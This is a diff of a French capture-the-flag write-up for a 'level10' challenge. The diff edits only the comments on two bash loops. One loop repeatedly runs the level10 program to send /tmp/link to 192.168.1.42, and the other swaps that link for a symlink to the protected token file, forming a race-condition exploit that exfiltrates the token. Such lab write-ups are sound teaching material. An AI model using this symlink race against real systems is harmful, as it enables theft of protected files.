@@ -51,7 +51,7 @@ On va donc chercher a exploiter la **race-condition-vulnerability**, avec 2 scri
 
 ### /tmp/loop.sh
 ```bash
-# Ce script lance la requete d'envoie de fichier en boucle en parallele de l'autre script
+# Ce script lance la requete d'envoie de fichier en boucle
 while true;
 do
 	/home/user/level10/level10 /tmp/link 192.168.1.42 > /dev/null
@@ -61,7 +61,7 @@ done
 
 ### /tmp/ln.sh
 ```bash
-# Ce script creer un fichier sur lequel on a les droits et fait un lien symbolique du fichier token en boucle, en parallele de l'autre script
+# Ce script creer un fichier sur lequel on a les droits et fait un lien symbolique du fichier token en boucle
 while true;
 do
 	rm -f /tmp/link
